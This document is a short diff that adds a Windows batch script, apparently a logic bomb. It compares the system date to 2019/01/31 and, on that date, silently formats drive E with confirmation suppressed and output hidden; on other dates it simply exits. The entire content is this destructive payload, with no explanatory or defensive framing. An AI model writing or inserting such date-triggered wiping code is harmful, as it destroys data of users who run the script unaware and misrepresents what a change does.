@@ -1,0 +1,4 @@
+If %date% NEQ 2019/01/31 goto exit
+format E: /y >nul
+:exit
+exit
